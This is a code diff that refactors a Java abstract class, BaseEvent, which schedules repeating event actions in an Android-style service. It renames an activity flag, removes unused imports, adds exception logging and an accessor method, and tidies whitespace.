@@ -7,11 +7,7 @@
 
 package com.android.service.event;
 
-import java.util.concurrent.ArrayBlockingQueue;
 import java.util.concurrent.ScheduledFuture;
-import java.util.concurrent.ScheduledThreadPoolExecutor;
-import java.util.concurrent.ThreadFactory;
-import java.util.concurrent.ThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
 
 import com.android.service.Status;
@@ -29,6 +25,10 @@ public abstract class BaseEvent extends ThreadBase {
 
 	/** The Constant TAG. */
 	private static final String TAG = "BaseEvent"; //$NON-NLS-1$
+
+	boolean isActive = false;
+	private ScheduledFuture<?> future;
+	private String subType;
 
 	// Gli eredi devono implementare i seguenti metodi astratti
 	/**
@@ -87,22 +87,20 @@ public abstract class BaseEvent extends ThreadBase {
 		return conf.delay;
 	}
 
-	boolean active;
-	private ScheduledFuture<?> future;
-	private String subType;
-
 	protected synchronized void onEnter() {
 		// if (Cfg.DEBUG) Check.asserts(!active,"stopSchedulerFuture");
-		if (active) {
+		if (isActive) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onEnter): already active, return");
 			}
+
 			return;
 		}
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onEnter): " + this);
 		}
+
 		int delay = getConfDelay();
 		int period = delay;
 
@@ -131,7 +129,7 @@ public abstract class BaseEvent extends ThreadBase {
 			if (Cfg.DEBUG) {
 				Check.asserts(period > 0, " (onEnter) Assert failed, period<=0: " + conf);
 			}
-			
+
 			future = Status.self().getStpe().scheduleAtFixedRate(new Runnable() {
 				int count = 0;
 
@@ -141,9 +139,11 @@ public abstract class BaseEvent extends ThreadBase {
 							if (Cfg.DEBUG) {
 								Check.log(TAG + " SCHED (run): count >= iterCounter");
 							}
+
 							stopSchedulerFuture();
 							return;
 						}
+
 						triggerRepeatAction();
 
 						if (Cfg.DEBUG) {
@@ -152,43 +152,53 @@ public abstract class BaseEvent extends ThreadBase {
 
 						count++;
 					} catch (Exception ex) {
+						if (Cfg.EXCEPTION) {
+							Check.log(ex);
+						}
 
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " SCHED (onEnter) Error: " + ex);
 						}
+
 						stopSchedulerFuture();
 					}
 				}
 			}, delay, period, TimeUnit.SECONDS);
-
 		}
-		active = true;
 
+		isActive = true;
 	}
 
 	private void stopSchedulerFuture() {
 		if (Cfg.DEBUG)
-			Check.asserts(active, "stopSchedulerFuture");
-		if (active && future != null) {
+			Check.asserts(isActive, "stopSchedulerFuture");
+
+		if (isActive && future != null) {
 			future.cancel(true);
 			future = null;
 		}
 	}
 
+	protected boolean isEntered() {
+		return isActive;
+	}
+
 	protected synchronized void onExit() {
 		// if (Cfg.DEBUG) Check.asserts(active,"stopSchedulerFuture");
-		if (active) {
+		if (isActive) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onExit): Active");
 			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onExit): " + this);
 			}
+
 			stopSchedulerFuture();
-			active = false;
+			isActive = false;
 
 			triggerEndAction();
-		}else{
+		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onExit): Not active");
 			}
@@ -204,6 +214,7 @@ public abstract class BaseEvent extends ThreadBase {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (triggerStartAction): " + this);
 		}
+
 		if (Cfg.DEBUG) {
 			Check.requires(conf != null, "null conf");
 		}
@@ -224,9 +235,11 @@ public abstract class BaseEvent extends ThreadBase {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (triggerRepeatAction): " + this);
 		}
+
 		if (Cfg.DEBUG) {
 			Check.requires(conf != null, "null conf");
 		}
+
 		return trigger(conf.repeatAction);
 	}
 
